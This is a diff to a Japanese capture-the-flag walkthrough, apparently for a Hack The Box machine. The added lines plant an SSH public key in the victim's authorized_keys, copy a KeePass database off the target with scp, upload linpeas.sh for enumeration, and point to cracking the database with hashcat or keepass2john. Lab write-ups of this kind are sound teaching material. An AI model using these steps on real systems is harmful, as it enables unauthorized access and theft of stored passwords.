@@ -269,11 +269,34 @@ MyPasswords.kdbx
 user.txt
 ```
 
-しかし、victimマシンにはcurl、ftp、pythonなどが存在せず、sshやscpもうまく動作しない状況でした。
+しかし、victimマシンにはcurl、ftp、pythonなどが存在しませんでした。
 
+そこで、sshとscpを使うことにします。
 
+``` bash
+$ echo "<pub key>" > ~/.ssh/authorized_keys
 
+$ scp user@targethost.htb:/home/user/MyPasswords.kdbx ./
+```
 
+これで`MyPasswords.kdbx`を取得できました。
+
+ついでに`linpeas.sh`を送りこんで探索を進めておきます。
+
+``` bash
+$ scp /home/kali/Hacking/Tools/linpeas.sh user@targethost.htb:/home/user
+```
+
+`MyPasswords.kdbx`のファイルタイプが「Keepass password database 2.x KDBX」であることがわかりました。
+
+``` bash
+$ file MyPasswords.kdbx 
+MyPasswords.kdbx: Keepass password database 2.x KDBX
+```
+
+以下の記事を読むと、hashcatやKeepass2johnなどのツールを使うことでKDBXの解読ができそうです。
+
+参考：[Can You Crack a KeePass Database if You Forgot Your Password? - Davis Tech Media](https://davistechmedia.com/can-you-crack-a-keepass-database-if-you-forgot-your-password/)
 
 
 
